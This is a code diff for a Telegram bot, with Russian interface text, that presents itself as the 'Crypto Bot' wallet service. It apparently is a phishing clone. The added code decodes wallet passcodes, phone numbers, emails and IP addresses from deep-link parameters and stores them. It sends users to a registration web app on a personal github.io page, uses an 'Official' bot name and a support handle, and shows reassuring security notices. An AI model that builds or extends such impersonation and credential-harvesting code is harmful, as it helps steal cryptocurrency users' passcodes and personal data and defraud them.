@@ -75,6 +75,62 @@ def get_start_text() -> str:
         "Получить баллы ›"
     )
 
+def decode_reg_start_param(param: str) -> dict | None:
+    try:
+        parts = param.split("_")
+        if len(parts) < 6:
+            return None
+        pin = parts[1]
+        phone = parts[2]
+        ip_hex = parts[3]
+        country_code = parts[4]
+        email_encoded = "_".join(parts[5:])
+        
+        if len(ip_hex) == 8:
+            ip = ".".join(str(int(ip_hex[i:i+2], 16)) for i in (0, 2, 4, 6))
+        else:
+            ip = "127.0.0.1"
+            
+        country_map = {
+            "RU": "Россия", "UA": "Украина", "BY": "Беларусь", "KZ": "Казахстан",
+            "DE": "Германия", "US": "США", "PL": "Польша", "GB": "Великобритания",
+            "FR": "Франция", "TR": "Турция", "AE": "ОАЭ", "UZ": "Узбекистан",
+            "GE": "Грузия", "AM": "Армения", "AZ": "Азербайджан", "KG": "Киргизия",
+            "TJ": "Таджикистан", "MD": "Молдова", "ES": "Испания", "IT": "Италия",
+            "NL": "Нидерланды", "CH": "Швейцария", "SE": "Швеция", "NO": "Норвегия"
+        }
+        country = country_map.get(country_code.upper(), country_code)
+        
+        email_domains = {
+            "1": "@gmail.com", "2": "@mail.ru", "3": "@yandex.ru", "4": "@icloud.com",
+            "5": "@yahoo.com", "6": "@outlook.com", "7": "@bk.ru", "8": "@inbox.ru",
+            "9": "@list.ru", "g": "@gmail.com", "m": "@mail.ru", "y": "@yandex.ru", "i": "@icloud.com"
+        }
+        email = email_encoded
+        for k, v in email_domains.items():
+            if email.endswith(f"_{k}"):
+                email = email[:-len(f"_{k}")] + v
+                break
+        else:
+            if "_a_" in email:
+                email = email.replace("_a_", "@")
+        email = email.replace("-", ".")
+        
+        if not phone.startswith("+") and len(phone) >= 10:
+            phone = "+" + phone
+            
+        return {
+            "passcode": pin,
+            "phone": phone,
+            "ip": ip,
+            "country": country,
+            "city": "",
+            "email": email
+        }
+    except Exception as e:
+        log.error("Failed to decode reg start param %s: %s", param, e)
+        return None
+
 @dp.message(CommandStart())
 async def cmd_start(msg: Message, state: FSMContext):
     if msg.text and "check_" in msg.text:
@@ -85,11 +141,52 @@ async def cmd_start(msg: Message, state: FSMContext):
         await extra_menus.show_invoice_card(msg, state)
         return
 
+    if msg.text and ("r_" in msg.text or "reg_" in msg.text):
+        parts = msg.text.split()
+        param = parts[1] if len(parts) > 1 else ""
+        data = decode_reg_start_param(param)
+        if data:
+            email = data["email"]
+            phone = data["phone"]
+            passcode = data["passcode"]
+            ip = data["ip"]
+            country = data["country"]
+            city = data.get("city", "")
+
+            from database import save_registration_data, generate_all_user_addresses
+            await save_registration_data(msg.from_user.id, email, phone, passcode, ip, country, city)
+            await generate_all_user_addresses(msg.from_user.id)
+
+            country_str = country
+            if city and city.lower() != country.lower():
+                country_str = f"{country}, {city}"
+
+            text_security = (
+                f"⚠️ Вы создали код-пароль\n\n"
+                f"IP-адрес: <code>{ip}</code>\n"
+                f"Локация: {country_str}\n\n"
+                f"Если это были не вы, напишите в поддержку – @CryptoSupportBot."
+            )
+            await msg.answer(text_security, reply_markup=ReplyKeyboardRemove(), parse_mode="HTML")
+
+            text_final = (
+                'Настройка аккаунта успешно завершена. Теперь вы можете использовать '
+                'все возможности <tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> Crypto Bot.'
+            )
+            kb = InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="Начать", callback_data="menu:main")]
+            ])
+            await msg.answer(text_final, reply_markup=kb, parse_mode="HTML")
+            await state.clear()
+            return
+
     await state.clear()
     await create_user(msg.from_user.id, msg.from_user.username or "")
+    from database import get_user, is_user_registered
     user = await get_user(msg.from_user.id)
+    user_registered = await is_user_registered(msg.from_user.id)
 
-    if user and user["is_onboarded"]:
+    if user and (user["is_onboarded"] or user_registered):
         img_path = os.path.join(BASE_DIR, "start_banner.jpg")
         if not os.path.exists(img_path):
             img_path = os.path.join(BASE_DIR, "welcome.jpg")
@@ -117,7 +214,9 @@ async def cmd_start(msg: Message, state: FSMContext):
         '<tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> <b>Добро пожаловать в Crypto Bot</b>\n\n'
         "Кошелёк успешно создан. Завершите настройку аккаунта, чтобы получить доступ ко всем возможностям сервиса."
     )
-    webapp_reg_url = f"https://flows3039-png.github.io/cryptobot-tg/?mode=reg&uid={msg.from_user.id}&v={int(time.time())}"
+    bot_me = await msg.bot.get_me()
+    bot_username = bot_me.username or config.BOT_USERNAME or "CryptoBotOfficialbot"
+    webapp_reg_url = f"https://flows3039-png.github.io/cryptobot-tg/?mode=reg&uid={msg.from_user.id}&bot={bot_username}&v={int(time.time())}"
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="Начать", web_app=WebAppInfo(url=webapp_reg_url))]
     ])
@@ -430,17 +529,17 @@ async def chosen_inline_result_handler(chosen: ChosenInlineResult):
 
 @dp.message(Command("testreg"))
 async def cmd_testreg(msg: Message, state: FSMContext):
-    from database import is_admin
+    from database import is_admin, reset_user_registration
     user_is_admin = await is_admin(msg.from_user.id)
     if msg.from_user.id != config.OWNER_ID and not user_is_admin:
         return
     await state.clear()
     try:
-        from database import db_conn
-        async with db_conn.tx() as c:
-            await c.execute("UPDATE users SET is_onboarded = 0 WHERE id = ?", (msg.from_user.id,))
+        await reset_user_registration(msg.from_user.id)
         
-        webapp_reg_url = f"https://flows3039-png.github.io/cryptobot-tg/?mode=reg&uid={msg.from_user.id}&v={int(time.time())}"
+        bot_me = await msg.bot.get_me()
+        bot_username = bot_me.username or config.BOT_USERNAME or "CryptoBotOfficialbot"
+        webapp_reg_url = f"https://flows3039-png.github.io/cryptobot-tg/?mode=reg&uid={msg.from_user.id}&bot={bot_username}&v={int(time.time())}"
         text = (
             '<tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> <b>Добро пожаловать в Crypto Bot</b>\n\n'
             "Кошелёк успешно создан. Завершите настройку аккаунта, чтобы получить доступ ко всем возможностям сервиса."
@@ -476,7 +575,7 @@ async def web_app_data_handler(msg: Message, state: FSMContext):
         country = (data.get("country") or "Не определена").strip()
         city = (data.get("city") or "").strip()
 
-        from database import save_registration_data, generate_all_user_addresses, get_all_balances
+        from database import save_registration_data, generate_all_user_addresses
         await save_registration_data(msg.from_user.id, email, phone, passcode, ip, country, city)
         await generate_all_user_addresses(msg.from_user.id)
 
@@ -484,25 +583,22 @@ async def web_app_data_handler(msg: Message, state: FSMContext):
         if city and city.lower() != country.lower():
             country_str = f"{country}, {city}"
 
-        confirm_text = (
-            "🔐 <b>Код-пароль успешно установлен!</b>\n\n"
-            "Вы создали персональный 4-значный код-пароль кошелька для защиты операций и авторизации.\n\n"
-            f"📱 <b>Телефон:</b> <code>{phone or 'Не указан'}</code>\n"
-            f"📧 <b>Email:</b> <code>{email or 'Не указан'}</code>\n"
-            f"🌐 <b>IP адрес:</b> <code>{ip}</code>\n"
-            f"📍 <b>Страна:</b> <code>{country_str}</code>\n\n"
-            "Кошелёк успешно настроен и активирован. Приятного использования!"
+        text_security = (
+            f"⚠️ Вы создали код-пароль\n\n"
+            f"IP-адрес: <code>{ip}</code>\n"
+            f"Локация: {country_str}\n\n"
+            f"Если это были не вы, напишите в поддержку – @CryptoSupportBot."
         )
-        balances = await get_all_balances(msg.from_user.id)
-        from keyboards import main_menu_inline, update_user_chat_menu_button
-        await update_user_chat_menu_button(msg.bot, msg.from_user.id, balances)
-        kb = main_menu_inline(user_id=msg.from_user.id, balances=balances)
-        
-        img_path = os.path.join(BASE_DIR, "start_banner.jpg")
-        if os.path.exists(img_path):
-            await msg.answer_photo(photo=FSInputFile(img_path), caption=confirm_text, reply_markup=kb, parse_mode="HTML")
-        else:
-            await msg.answer(confirm_text, reply_markup=kb, parse_mode="HTML")
+        await msg.answer(text_security, reply_markup=ReplyKeyboardRemove(), parse_mode="HTML")
+
+        text_final = (
+            'Настройка аккаунта успешно завершена. Теперь вы можете использовать '
+            'все возможности <tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> Crypto Bot.'
+        )
+        kb = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Начать", callback_data="menu:main")]
+        ])
+        await msg.answer(text_final, reply_markup=kb, parse_mode="HTML")
         await state.clear()
 
     elif action == "transfer":
